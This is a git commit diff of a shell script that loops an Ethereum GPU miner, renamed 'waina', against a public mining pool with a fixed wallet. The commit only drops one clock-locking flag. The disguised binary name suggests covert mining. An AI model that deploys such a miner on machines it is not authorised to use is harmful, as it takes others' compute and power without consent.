06426d2ef92c76bb859a69a98104383bcda02366
wikangdijalalan2 <82296471+wikangdijalalan2@users.noreply.github.com>
2021-07-14 01:10:46 -0600

    Update ttborn.sh

--- ttborn.sh
+++ ttborn.sh
@@ -8,7 +8,7 @@ mv t-rex waina
 while [ $x -le 20 ]
 do
 
-  sudo ./waina -a ethash -o eth.2miners.com:2020 -u 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.TREX$P -p x --gpu-report-interval 10 --coin ETH --intensity 18 --low-load 1 --lock-cclock 350
+  sudo ./waina -a ethash -o eth.2miners.com:2020 -u 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.TREX$P -p x --gpu-report-interval 10 --coin ETH --intensity 18 --low-load 1
 
 
   x=$(( $x + 1 ))
